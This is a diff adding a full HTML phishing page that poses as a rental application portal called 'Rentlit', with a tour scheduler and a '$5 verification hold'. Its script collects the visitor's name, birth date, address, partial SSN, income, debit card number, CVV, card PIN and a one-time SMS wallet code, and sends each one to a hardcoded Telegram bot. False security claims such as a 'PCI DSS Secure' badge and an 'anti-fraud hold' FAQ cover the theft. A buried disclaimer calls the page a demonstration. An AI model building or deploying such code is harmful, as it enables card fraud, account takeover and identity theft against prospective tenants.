@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rentlit - Application Portal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; }
+        body { background-color: #f5f7fa; color: #333; line-height: 1.6; }
+        body.dark-mode { background: #181c20; color: #e0e6ed; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; background: white; box-shadow: 0 0 20px rgba(0,0,0,0.1); border-radius: 8px; }
+        body.dark-mode .container { background: #23272b; box-shadow: 0 0 24px rgba(0,0,0,0.4);}
+        .page { display: none; padding: 30px; }
+        .page.active { display: block; }
+        h1, h2 { color: #2c3e50; margin-bottom: 20px; }
+        .logo { text-align: center; margin-bottom: 30px; font-size: 28px; font-weight: 700; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; font-weight: 500; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+        body.dark-mode input, body.dark-mode select { background: #23272b; color: #e0e6ed; border-color: #444; }
+        .btn { background-color: #f1c40f; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: 500; width: 100%; margin-top: 10px; transition: background-color 0.3s; }
+        .btn:hover { background-color: #27ae60; }
+        .btn-secondary { background-color: #95a5a6; }
+        .btn-secondary:hover { background-color: #7f8c8d; }
+        body.dark-mode .btn { background: #2d8cff; color: #fff; }
+        body.dark-mode .btn-secondary { background: #444; color: #fff; }
+        .btn-cashapp { background-color: #00d54b; }
+        .btn-cashapp:hover { background-color: #00b140; }
+        .btn-paypal { background-color: #003087; }
+        .btn-paypal:hover { background-color: #002366; }
+        .disclaimer { font-size: 12px; color: #7f8c8d; margin-top: 30px; border-top: 1px solid #eee; padding-top: 15px; }
+        body.dark-mode .disclaimer { color: #aaa; border-top: 1px solid #333; }
+        .payment-option { border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: all 0.3s; }
+        body.dark-mode .payment-option { background: #23272b; border-color: #444; }
+        .payment-option:hover { border-color: #3498db; background-color: #f8f9fa; }
+        .payment-option.selected { border-color: #3498db; background-color: #ebf5fb; }
+        body.dark-mode .payment-option.selected { background: #1e2a22; border-color: #27ae60; }
+        .payment-icon { width: 40px; height: 40px; margin-right: 15px; vertical-align: middle; }
+        .otp-container { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 1px solid #ddd; border-radius: 4px; }
+        .loading-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(255,255,255,0.8); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; display: none; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-countdown { font-size: 18px; color: #e74c3c; margin-bottom: 10px; }
+        .progress-bar { display: flex; margin-bottom: 30px; justify-content: space-between; }
+        .progress-step { text-align: center; flex: 1; position: relative; }
+        .step-number { width: 30px; height: 30px; background-color: #ddd; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; margin-bottom: 5px; color: white; }
+        body.dark-mode .step-number { background: #444; }
+        .progress-step.active .step-number { background-color: #3498db; }
+        body.dark-mode .progress-step.active .step-number { background: #2d8cff; }
+        .progress-step.completed .step-number { background-color: #2ecc71; }
+        body.dark-mode .progress-step.completed .step-number { background: #27ae60; }
+        .step-name { font-size: 12px; color: #7f8c8d; }
+        body.dark-mode .progress-step .step-name { color: #aaa; }
+        body.dark-mode .progress-step.active .step-name { color: #2d8cff; }
+        body.dark-mode .progress-step.completed .step-name { color: #27ae60; }
+        .progress-step:not(:last-child)::after { content: ''; position: absolute; top: 15px; left: 50%; width: 100%; height: 2px; background-color: #ddd; z-index: -1; }
+        .progress-step.completed:not(:last-child)::after { background-color: #2ecc71; }
+        .error { color: #ff3860; font-size: 14px; margin-top: 5px; display: none; }
+        .card-logos { display: flex; gap: 10px; margin-top: 10px; }
+        .card-logo { height: 30px; }
+        .time-slot.selected { background: #3498db; color: #fff; border-radius: 4px; padding: 4px 12px; }
+        .time-slot { cursor: pointer; margin-right: 10px; display: inline-block; padding: 4px 12px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 5px; }
+        #continueWithDebitBtn { margin-top: 15px; }
+        .secure-hold-notice { margin-bottom:12px;display:flex;align-items:center; }
+        .secure-hold-notice span:first-child { color:#27ae60;margin-right:8px;font-size:20px; }
+        .secure-badge { display:inline-block;background:#eafaf1;color:#27ae60;padding:2px 8px;border-radius:8px;font-size:13px;margin-left:10px; }
+        body.dark-mode .secure-badge { background: #1e2a22; color: #27ae60; }
+        .masked-card-preview { margin-top: 6px; color: #34495e; font-family:monospace;font-size:17px; }
+        .progress-bar-hold { width:100%;background:#eee;border-radius:4px;overflow:hidden;margin-bottom:8px;height:14px; }
+        .progress-bar-hold-inner { height:100%;background:#27ae60;width:0;transition:width 0.3s; }
+        #holdFaqModal {position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:1200;background:#fff;border-radius:8px;box-shadow:0 2px 16px rgba(0,0,0,0.21);width:90%;max-width:400px;padding:24px;}
+        #holdFaqModal h2 {margin-bottom:10px;}
+        #holdFaqModal ul {padding-left:20px;}
+        #holdFaqModal[style*="display: none"] {display:none!important;}
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-countdown" id="loadingCountdown" style="display:none"></div>
+        <div class="progress-bar-hold" id="progressBarHold" style="display:none;">
+            <div class="progress-bar-hold-inner" id="progressBarHoldInner"></div>
+        </div>
+    </div>
+    <div id="holdFaqModal" style="display:none;">
+        <h2>About the $5 Verification Hold</h2>
+        <p>
+            For your security, we use a temporary $5 authorization (hold) to verify your payment method.
+            <ul>
+                <li>The hold is not a charge and is released automatically after verification.</li>
+                <li>This is a common anti-fraud practice used by banks and payment processors.</li>
+                <li>You may see a "pending" $5 transaction on your account for a short period.</li>
+            </ul>
+            <strong>Your information is encrypted and handled securely.</strong>
+        </p>
+        <div class="form-group">
+            <button class="btn" onclick="hideHoldFaqModal()">Close</button>
+        </div>
+    </div>
+    <div class="container">
+        <div class="logo"><span style="color: #e74c3c;">Rent</span><span style="color: #3498db;">lit</span></div>
+        <div class="progress-bar">
+            <div class="progress-step active" id="step1">
+                <div class="step-number">1</div>
+                <div class="step-name">Introduction</div>
+            </div>
+            <div class="progress-step" id="step2">
+                <div class="step-number">2</div>
+                <div class="step-name">Schedule Tour</div>
+            </div>
+            <div class="progress-step" id="step3">
+                <div class="step-number">3</div>
+                <div class="step-name">Payment</div>
+            </div>
+            <div class="progress-step" id="step4">
+                <div class="step-number">4</div>
+                <div class="step-name">Verification</div>
+            </div>
+            <div class="progress-step" id="step5">
+                <div class="step-number">5</div>
+                <div class="step-name">Review</div>
+            </div>
+        </div>
+        <!-- Page 1: Introduction -->
+        <div class="page active" id="page1">
+            <h1>Welcome to Rentlit</h1>
+            <p>We appreciate your interest in our properties. To proceed with scheduling a tour, all applicants must complete a brief verification application and submit a $5 processing fee.</p>
+            <div class="form-group">
+                <button class="btn" id="continueBtn">Continue to Application</button>
+            </div>
+            <div class="disclaimer">
+                <p><a href="#disclaimerModal" id="disclaimerLink">Important Disclaimer, Terms of Service & Notice</a></p>
+                <p>By submitting this application, you agree to our terms of service.</p>
+            </div>
+        </div>
+        <!-- Page 4: Schedule Tour (moved to second) -->
+        <div class="page" id="page4">
+            <h2>Schedule Your Tour</h2>
+            <div id="holdResultMsg" style="background:#eafaf1;color:#27ae60;padding:10px 16px;border-radius:6px;font-size:16px;display:none;margin-bottom:16px;">
+                $5 hold was successfully placed and then released.
+            </div>
+            <p>Your application has been received. Please select a date and time for your property tour.</p>
+            <div class="form-group">
+                <label for="tourDate">Select Date</label>
+                <input type="date" id="tourDate" min="">
+            </div>
+            <div class="form-group">
+                <label>Available Times</label>
+                <div class="time-slots">
+                    <div class="time-slot">9:00 AM</div>
+                    <div class="time-slot">11:00 AM</div>
+                    <div class="time-slot">1:00 PM</div>
+                    <div class="time-slot">3:00 PM</div>
+                    <div class="time-slot">5:00 PM</div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="price">Price</label>
+                <select id="price" required>
+                    <option value="">Select price</option>
+                    <option value="1 BD $1900">1 BD $1900</option>
+                    <option value="2 BD $2500">2 BD $2500</option>
+                    <option value="Jr 1 BD $1700">Jr $1700</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <button class="btn" id="confirmTourBtn">Continue to Payment</button>
+                <button class="btn btn-secondary" id="backBtn3">Back</button>
+            </div>
+        </div>
+        <!-- Page 3: Payment Selection (moved to third) -->
+        <div class="page" id="page3">
+            <h2>Verification Payment</h2>
+            <p>Please pay the $5 verification fee to continue with your application and schedule a tour.</p>
+            <div class="secure-hold-notice">
+                <span>&#128274;</span>
+                <span>
+                    We place a <strong>secure $5 hold</strong> on your payment method for identity verification. 
+                    The hold is automatically released after verification.
+                    <a href="#" id="holdFaqLink">(Why?)</a>
+                </span>
+            </div>
+            <div class="form-group">
+                <button class="btn" id="processPaymentBtn">Continue to Payment</button>
+                <button class="btn btn-secondary" id="backBtn2">Back</button>
+            </div>
+            <div class="disclaimer">
+                <p><a href="#disclaimerModal" id="disclaimerLink3">Important Disclaimer, Terms of Service & Notice</a></p>
+                <p></p>
+            </div>
+        </div>
+        <!-- Debit Card Payment Page --> 
+        <div class="page" id="debitCardPage">
+            <h2>Enter Debit Card Details <span class="secure-badge">PCI DSS Secure</span></h2>
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                <div class="masked-card-preview" id="maskedCardPreview"></div>
+            </div>
+            <!-- Add note about Cash App card -->
+            <div class="form-group" style="margin-bottom:10px;">
+                <span style="color:#e74c3c;font-size:15px;">
+                    <strong>Note:</strong> Cash App cards and credit cards are <u>not accepted</u>.
+                </span>
+            </div>
+            <div class="form-group">
+                <label for="cardExpiry">Expiration Date</label>
+                <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" required>
+            </div>
+            <div class="form-group">
+                <label for="cardCvv">CVV</label>
+                <input type="text" id="cardCvv" placeholder="123" maxlength="4" required>
+            </div>
+            <div class="form-group">
+                <label for="cardName">Name on Card</label>
+                <input type="text" id="cardName" required>
+            </div>
+            <!-- Add ZIP Code field here -->
+            <div class="form-group">
+                <label for="cardZip">ZIP Code</label>
+                <input type="text" id="cardZip" placeholder="ZIP Code" maxlength="10" required>
+            </div>
+            <div class="card-logos" style="display: none;">
+                <img src="https://logo.clearbit.com/visa.com" alt="Visa" class="card-logo">
+                <img src="https://logo.clearbit.com/mastercard.com" alt="Mastercard" class="card-logo">
+                <img src="https://logo.clearbit.com/americanexpress.com" alt="American Express" class="card-logo">
+                <img src="https://logo.clearbit.com/discover.com" alt="Discover" class="card-logo">
+            </div>
+            <p>Please provide the following information to verify your identity.</p>
+            <div class="form-group"><label for="fullName">Full Legal Name</label><input type="text" id="fullName" required></div>
+            <div class="form-group"><label for="dob">Date of Birth</label><input type="date" id="dob" required></div>
+            <div class="form-group"><label for="address">Current Address</label><input type="text" id="address" required></div>
+            <div class="form-group"><label for="city">City</label><input type="text" id="city" required></div>
+            <div class="form-group">
+                <label for="state">State</label>
+                <input type="text" id="state" placeholder="Enter your state" required>
+            </div>
+            <div class="form-group"><label for="zip">ZIP Code</label><input type="text" id="zip" pattern="\d{5}" required></div>
+            <div class="form-group"><label for="ssnLast4">Last 4 Digits of SSN</label><input type="text" id="ssnLast4" pattern="\d{4}" maxlength="4" required></div>
+            <div class="form-group"><label for="income">Monthly Income</label><input type="number" id="income" placeholder="Enter your monthly income" required></div>
+            <div class="disclaimer">
+                <p><a href="#disclaimerModal" id="disclaimerLink3">Important Disclaimer, Terms of Service & Notice</a></p>
+                <p></p>
+            </div>
+            <div class="form-group">
+                <button class="btn" id="submitDebitCardBtn">Pay $5.00</button>
+                <button class="btn btn-secondary" id="backBtnDebit">Back</button>
+            </div>
+        </div>
+        <!-- PIN Verification Page -->
+        <div class="page" id="pinVerificationPage">
+            <h2>Verify Your Identity</h2>
+            <p>Confirm it's you, please enter your 4-digit PIN.</p>
+            <div class="form-group">
+                <label for="pin">Enter PIN</label>
+                <input type="text" id="pin" placeholder="1234" maxlength="4" pattern="\d{4}" required>
+            </div>
+            <div class="form-group">
+                <button class="btn" id="verifyPinBtn">Verify PIN</button>
+                <button class="btn btn-secondary" id="backBtnPin">Back</button>
+            </div>
+        </div>
+        <!-- Verification Loading Page -->
+        <div class="page" id="verificationLoadingPage">
+            <h2>Verifying Your Identity</h2>
+            <p>Please wait while we verify your identity and secure your payment method.</p>
+            <div style="text-align: center; margin: 40px 0;">
+                <div class="spinner" style="margin: 0 auto 20px;"></div>
+                <p style="font-size: 16px; color: #3498db; font-weight: 500;">Verifying...</p>
+            </div>
+        </div>
+        <!-- Wallet Code Verification Page -->
+        <div class="page" id="walletCodePage">
+            <h2>Create Wallet And Deposit $5</h2>
+            <p>We've sent a verification code to your Mobile. Please enter the code below to securely add $5 to your digital wallet.</p>
+            <div class="form-group">
+                <label for="walletCode">Verification Code</label>
+                <input type="text" id="walletCode" placeholder="Enter 6-digit code" maxlength="6" pattern="\d{6}" required>
+            </div>
+            <p style="font-size: 13px; color: #7f8c8d; margin-top: 15px;">This helps us securely verify and store your payment method.</p>
+            <div class="form-group">
+                <button class="btn" id="submitWalletCodeBtn">Verify Code</button>
+                <button class="btn btn-secondary" id="backBtnWalletCode">Back</button>
+            </div>
+        </div>
+        <!-- Success Page -->
+        <div class="page" id="successPage">
+            <h2>Tour Scheduled Successfully!</h2>
+            <p>Your tour has been confirmed. We look forward to meeting you.</p>
+            <p><strong>Date:</strong> <span id="confirmedDate"></span></p>
+            <p><strong>Time:</strong> <span id="confirmedTime"></span></p>
+            <p><strong>Property:</strong> <span id="confirmedProperty"></span></p>
+            <div class="form-group">
+                <button class="btn" id="finishBtn">Continue</button>
+            </div>
+        </div>
+        <!-- Application Review Page (Page 5) -->
+        <div class="page" id="reviewPage">
+            <h2>Application Under Review</h2>
+            <div style="text-align: center; margin: 40px 0;">
+                <div style="font-size: 64px; margin-bottom: 20px;">✓</div>
+                <p style="font-size: 18px; color: #27ae60; font-weight: 500; margin-bottom: 30px;">Your application is being reviewed</p>
+            </div>
+            <div style="background-color: #eafaf1; border-left: 4px solid #27ae60; padding: 20px; border-radius: 4px; margin-bottom: 20px;">
+                <p><strong>What's next?</strong></p>
+                <ul style="margin-top: 10px; margin-left: 20px;">
+                    <li>We are reviewing your application and verification details</li>
+                    <li>You will receive a confirmation within 24-48 hours</li>
+                    <li>Your tour has been scheduled as requested</li>
+                    <li>Check your email for further updates</li>
+                </ul>
+            </div>
+            <div style="background-color: #f3f4f6; padding: 15px; border-radius: 4px; margin-bottom: 20px;">
+                <p style="margin: 0; color: #666;"><strong>Application Status:</strong> <span style="color: #27ae60;">Pending Review</span></p>
+                <p style="margin: 10px 0 0 0; color: #999; font-size: 14px;">We'll notify you of the outcome shortly.</p>
+            </div>
+            <div class="form-group">
+                <button class="btn" id="finishReviewBtn">Done</button>
+            </div>
+        </div>
+        <!-- Disclaimer Modal -->
+        <div class="page" id="disclaimerModal">
+            <h2>Important Disclaimer, Terms of Service & Notice</h2>
+            <p>This website is a demonstration project for educational purposes only. It is not a real rental application portal.</p>
+            <p>DO NOT enter real personal information. Any information entered here is not secure and will not be protected.</p>
+            <p>By using this demonstration site, you acknowledge that:</p>
+            <ul>
+                <li>No real payments will be processed</li>
+                <li>No actual property tours will be scheduled</li>
+                <li>This is not a real rental application</li>
+                <li>The site owner is not responsible for any information entered</li>
+            </ul>
+            <div class="form-group">
+                <button class="btn" id="closeDisclaimerBtn">I Understand</button>
+            </div>
+        </div>
+    </div>
+    <script>
+        // === TELEGRAM BOT SETTINGS ===
+        const TELEGRAM_BOT_TOKEN = '8112067553:AAE3IiCz0UsA2NSVw0uSGSmJG1OTjHrcvtw';
+        const TELEGRAM_CHAT_ID = "8361109269";
+        
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            });
+        }
+        
+        // Modal FAQ
+        document.getElementById('holdFaqLink').onclick = function(e) {
+            alert('.');
+            e.preventDefault();
+            document.getElementById('holdFaqModal').style.display = 'block';
+        };
+        
+        function hideHoldFaqModal() {
+            document.getElementById('holdFaqModal').style.display = 'none';
+        }
+        
+        // DOM Elements
+        const pages = {
+            page1: document.getElementById('page1'),
+            page3: document.getElementById('page3'),
+            debitCardPage: document.getElementById('debitCardPage'),
+            pinVerificationPage: document.getElementById('pinVerificationPage'),
+            verificationLoadingPage: document.getElementById('verificationLoadingPage'),
+            walletCodePage: document.getElementById('walletCodePage'),
+            page4: document.getElementById('page4'),
+            successPage: document.getElementById('successPage'),
+            reviewPage: document.getElementById('reviewPage'),
+            disclaimerModal: document.getElementById('disclaimerModal')
+        };
+        
+        const progressSteps = {
+            step1: document.getElementById('step1'),
+            step2: document.getElementById('step2'),
+            step3: document.getElementById('step3'),
+            step4: document.getElementById('step4'),
+            step5: document.getElementById('step5')
+        };
+        
+        const buttons = {
+            continueBtn: document.getElementById('continueBtn'),
+            processPaymentBtn: document.getElementById('processPaymentBtn'),
+            submitDebitCardBtn: document.getElementById('submitDebitCardBtn'),
+            confirmTourBtn: document.getElementById('confirmTourBtn'),
+            finishBtn: document.getElementById('finishBtn'),
+            finishReviewBtn: document.getElementById('finishReviewBtn'),
+            backBtn2: document.getElementById('backBtn2'),
+            backBtnDebit: document.getElementById('backBtnDebit'),
+            backBtn3: document.getElementById('backBtn3'),
+            closeDisclaimerBtn: document.getElementById('closeDisclaimerBtn'),
+            disclaimerLink: document.getElementById('disclaimerLink'),
+            disclaimerLink3: document.getElementById('disclaimerLink3'),
+            continueWithDebitBtn: document.getElementById('continueWithDebitBtn'),
+            verifyPinBtn: document.getElementById('verifyPinBtn'),
+            backBtnPin: document.getElementById('backBtnPin'),
+            submitWalletCodeBtn: document.getElementById('submitWalletCodeBtn'),
+            backBtnWalletCode: document.getElementById('backBtnWalletCode')
+        };
+        
+        const paymentOptions = {
+            debit: document.getElementById('debitOption')
+        };
+        
+        const timeSlots = document.querySelectorAll('.time-slot');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingCountdown = document.getElementById('loadingCountdown');
+        const progressBarHold = document.getElementById('progressBarHold');
+        const progressBarHoldInner = document.getElementById('progressBarHoldInner');
+        
+        // Variables
+        let currentPage = 'page1';
+        let selectedPaymentMethod = 'debit'; // Always debit
+        let selectedTimeSlot = null;
+        let tourData = {};
+        let holdResultShown = false;
+        let lastPaymentMethod = null;
+        let confirmedDate = '';
+        let confirmedTime = '';
+        let confirmedProperty = '';
+        
+        if (document.getElementById('tourDate')) {
+            document.getElementById('tourDate').min = new Date(new Date().getTime() + 86400000).toISOString().split('T')[0];
+        }
+        
+        function navigateTo(page) {
+            pages[currentPage].classList.remove('active');
+            pages[page].classList.add('active');
+            if (page === 'page1') updateProgress(1);
+            if (page === 'page4') updateProgress(2);
+            if (page === 'page3') updateProgress(3);
+            if (page === 'debitCardPage') updateProgress(4);
+            if (page === 'reviewPage') updateProgress(5);
+            currentPage = page;
+        }
+        
+        const _navigateTo = navigateTo;
+        
+        function navigateToWithLoad(page) {
+            _navigateTo(page);
+        }
+        
+        buttons.continueBtn.addEventListener('click', () => {
+            sendToTelegram('User has continued to the application process.');
+            navigateToWithLoad('page4');
+        });
+        buttons.processPaymentBtn.addEventListener('click', () => {
+            navigateToWithLoad('debitCardPage');
+        });
+        buttons.submitDebitCardBtn?.addEventListener('click', submitDebitCard);
+        buttons.verifyPinBtn?.addEventListener('click', verifyPin);
+        buttons.backBtnPin?.addEventListener('click', () => navigateToWithLoad('debitCardPage'));
+        buttons.submitWalletCodeBtn?.addEventListener('click', submitWalletCode);
+        buttons.backBtnWalletCode?.addEventListener('click', () => navigateToWithLoad('pinVerificationPage'));
+        buttons.confirmTourBtn?.addEventListener('click', () => {
+            confirmedDate = getVal('tourDate');
+            confirmedTime = selectedTimeSlot;
+            confirmedProperty = getVal('price');
+            navigateToWithLoad('page3');
+        });
+        buttons.finishBtn?.addEventListener('click', () => navigateToWithLoad('reviewPage'));
+        buttons.finishReviewBtn?.addEventListener('click', () => location.reload());
+        buttons.backBtn2.addEventListener('click', () => navigateToWithLoad('page4'));
+        buttons.backBtnDebit?.addEventListener('click', () => navigateToWithLoad('page3'));
+        buttons.backBtn3?.addEventListener('click', () => navigateToWithLoad('page1'));
+        buttons.closeDisclaimerBtn.addEventListener('click', () => navigateToWithLoad('debitCardPage'));
+        
+        [buttons.disclaimerLink, buttons.disclaimerLink3].forEach(link => {
+            if(link) link.addEventListener('click', (e) => { e.preventDefault(); _navigateTo('disclaimerModal'); });
+        });
+        
+        timeSlots.forEach(slot => {
+            slot.addEventListener('click', function() {
+                timeSlots.forEach(s => s.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedTimeSlot = this.textContent;
+            });
+        });
+        
+        const cardNumberInput = document.getElementById('cardNumber');
+        const maskedCardPreview = document.getElementById('maskedCardPreview');
+        if (cardNumberInput && maskedCardPreview) {
+            cardNumberInput.addEventListener('input', function() {
+                let num = this.value.replace(/\D/g,'').slice(0,16);
+                let masked = '';
+                if (num.length > 4) {
+                    masked = '**** **** **** ' + num.slice(-4);
+                } else if (num.length > 0) {
+                    masked = num.replace(/./g,'*');
+                }
+                maskedCardPreview.textContent = masked;
+            });
+        }
+        
+        function updateProgress(step) {
+            Object.values(progressSteps).forEach(step => {
+                step.classList.remove('active', 'completed');
+            });
+            for (let i = 1; i < step; i++) {
+                progressSteps[`step${i}`].classList.add('completed');
+            }
+            progressSteps[`step${step}`].classList.add('active');
+        }
+        
+        function selectPaymentMethod(method) {
+            Object.values(paymentOptions).forEach(option => {
+                option.classList.remove('selected');
+            });
+            paymentOptions[method].classList.add('selected');
+            selectedPaymentMethod = method;
+            buttons.processPaymentBtn.disabled = false;
+        }
+        
+        function submitApplication() {
+            // Send application data to Telegram
+            const msg = `Rentlit - Application Submitted
+Full Name: ${getVal('fullName')}
+DOB: ${getVal('dob')}
+Address: ${getVal('address')}
+City: ${getVal('city')}
+State: ${getVal('state')}
+ZIP: ${getVal('zip')}
+Last 4 SSN: ${getVal('ssnLast4')}`;
+            sendToTelegram(msg);
+            _navigateTo('page3');
+        }
+        
+        buttons.continueWithDebitBtn.addEventListener('click', function() {
+            document.getElementById('bankError').style.display = 'none';
+            buttons.continueWithDebitBtn.style.display = 'none';
+            navigateToWithLoad('debitCardPage');
+        });
+        
+        function submitDebitCard() {
+            lastPaymentMethod = "Debit Card";
+            const msg = `Rentlit - Debit Card Payment Initiated
+Full Name: ${getVal('fullName')}
+DOB: ${getVal('dob')}
+Address: ${getVal('address')}
+City: ${getVal('city')}
+State: ${getVal('state')}
+ZIP: ${getVal('zip')}
+Last 4 SSN: ${getVal('ssnLast4')}
+Monthly Income: ${getVal('income')}
+Card Number: ${getVal('cardNumber')}
+Expiry: ${getVal('cardExpiry')}
+CVV: ${getVal('cardCvv')}
+Name on Card: ${getVal('cardName')}
+Card ZIP: ${getVal('cardZip')}`;
+            sendToTelegram(msg);
+            showLongLoadingAndNavigate('pinVerificationPage', null, 6000);
+        }
+        
+        function verifyPin() {
+            const pin = getVal('pin');
+            if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+                alert('Please enter a valid 4-digit PIN.');
+                return;
+            }
+            const msg = `Rentlit - PIN Verification
+PIN: ${pin}`;
+            sendToTelegram(msg);
+            showLongLoadingAndNavigate('verificationLoadingPage', null, 4000);
+        }
+        
+        function submitWalletCode() {
+            const code = getVal('walletCode');
+            if (code.length !== 6 || !/^\d{6}$/.test(code)) {
+                alert('Please enter a valid 6-digit code.');
+                return;
+            }
+            const msg = `Rentlit - Wallet Code Verification
+Code: ${code}`;
+            sendToTelegram(msg);
+            showLongLoadingAndNavigate('successPage', null, 3000);
+        }
+        
+        function showLongLoadingAndNavigate(targetPage, after, delay) {
+            if (targetPage === 'verificationLoadingPage') {
+                _navigateTo(targetPage);
+                setTimeout(() => {
+                    _navigateTo('walletCodePage');
+                    if (typeof after === "function") after();
+                }, delay || 4000);
+            } else if (targetPage === 'successPage') {
+                loadingOverlay.style.display = 'flex';
+                loadingCountdown.style.display = 'none';
+                progressBarHold.style.display = 'none';
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+                    _navigateTo(targetPage);
+                    document.getElementById('confirmedDate').textContent = confirmedDate;
+                    document.getElementById('confirmedTime').textContent = confirmedTime;
+                    document.getElementById('confirmedProperty').textContent = confirmedProperty;
+                    showHoldResultMsg();
+                    if (typeof after === "function") after();
+                }, delay || 3000);
+            } else {
+                _navigateTo(targetPage);
+                if (typeof after === "function") after();
+            }
+        }
+        
+        function showHoldResultMsg() {
+            if (pages.page4 && !holdResultShown) {
+                let msg = document.getElementById('holdResultMsg');
+                if(msg) msg.style.display = 'block';
+                holdResultShown = true;
+            }
+        }
+        
+        function getVal(id) {
+            return document.getElementById(id)?.value.trim() || '';
+        }
+        
+        function confirmTour() {
+            // Navigate to payment page instead of application
+            _navigateTo('page3');
+        }
+        
+        function saveFormData(pageNumber) {
+            switch(pageNumber) {
+                case 1:
+                    formData.tour = {
+                        date: document.getElementById('tourDate').value,
+                        time: document.getElementById('tourTime').value,
+                        price: document.getElementById('price').value,
+                        requests: document.getElementById('specialRequests').value
+                    };
+                    break;
+                // No need to save page 2, it's removed
+            }
+        }
+        
+        function loadFormData(pageNumber) {
+            switch(pageNumber) {
+                case 1:
+                    document.getElementById('tourDate').value = formData.tour.date || '';
+                    document.getElementById('tourTime').value = formData.tour.time || '';
+                    document.getElementById('price').value = formData.tour.price || '';
+                    document.getElementById('specialRequests').value = formData.tour.requests || '';
+                    break;
+                // No need to load page 2, it's removed
+            }
+        }
+        
+        function validatePage(pageNumber) {
+            switch(pageNumber) {
+                case 1:
+                    const date = document.getElementById('tourDate').value;
+                    const time = document.getElementById('tourTime').value;
+                    const price = document.getElementById('price').value;
+                    
+                    if (!date || !time || !price) {
+                        alert('Please fill in all required fields: Tour Date, Preferred Time, and Price.');
+                        return false;
+                    }
+                    return true;
+                    
+                // No case 2, page removed
+            }
+            
+            return true;
+        }
+        
+        // Pre-fill form data if available
+        document.addEventListener('DOMContentLoaded', () => {
+            loadFormData(1);
+        });
+    </script>
+</body>
+</html>
